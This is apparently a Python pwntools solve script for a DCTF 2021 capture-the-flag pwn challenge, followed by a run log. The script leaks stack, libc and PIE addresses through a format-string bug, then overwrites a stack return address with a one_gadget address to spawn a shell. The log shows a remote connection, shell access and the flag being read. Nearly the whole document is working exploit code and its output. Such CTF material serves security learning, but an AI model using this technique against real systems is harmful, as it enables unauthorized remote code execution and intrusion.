from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './formats_last_theorem'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "dctf-chall-formats-last-theorem.westeurope.azurecontainer.io"
  PORT = 7482
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
libc = elf.libc

s.recvuntil("It's getting kinda old at this point\n")
s.sendline("%20$p,%23$p,%22$p")

s.recvuntil("you entered\n")
r = s.recvuntil(",")[:-1]
stack_leak = int(r, 16)
r = s.recvuntil(",")[:-1]
libc_leak = int(r, 16)
libc_base = libc_leak - 0x21bf7
one_gadget  = libc_base + 0x4f3d5
malloc_hook = libc_base + libc.sym.__malloc_hook
r = s.recvuntil("\n")[:-1]
pie_leak = int(r, 16)
pie_base = pie_leak - 0x7d0

print("stack_leak =", hex(stack_leak))
print("libc_leak  =", hex(libc_leak))
print("libc_base  =", hex(libc_base))
print("pie_leak   =", hex(pie_leak))
print("pie_base   =", hex(pie_base))

s.recvuntil("It's getting kinda old at this point\n")

index = 6
buf = fmtstr_payload(index, {stack_leak-0x88 : one_gadget}, write_size="short")
s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/DCTF_2021/Pwn_Formats_last_theorem_400$ python3 solve01.py r
[*] '/home/mito/CTF/DCTF_2021/Pwn_Formats_last_theorem_400/formats_last_theorem'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to dctf-chall-formats-last-theorem.westeurope.azurecontainer.io on port 7482: Done
[*] '/lib/x86_64-linux-gnu/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
stack_leak = 0x7ffc07328820
libc_leak  = 0x7fba7f936bf7
libc_base  = 0x7fba7f915000
pie_leak   = 0x55adbd3877d0
pie_base   = 0x55adbd387000
[*] Switching to interactive mode
you entered
...
...
x07\xid
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ ls -l
total 20
-rw-r--r-- 1 root  root    34 May 15 19:46 flag.txt
-rwxr-xr-x 1 pilot pilot 8480 May 15 19:46 formats_last_theorem
-rw-r--r-- 1 root  root   237 May 15 19:46 startService.sh
$ cat flag.txt
dctf{N0t_all_7h30r3ms_s0und_g00d}


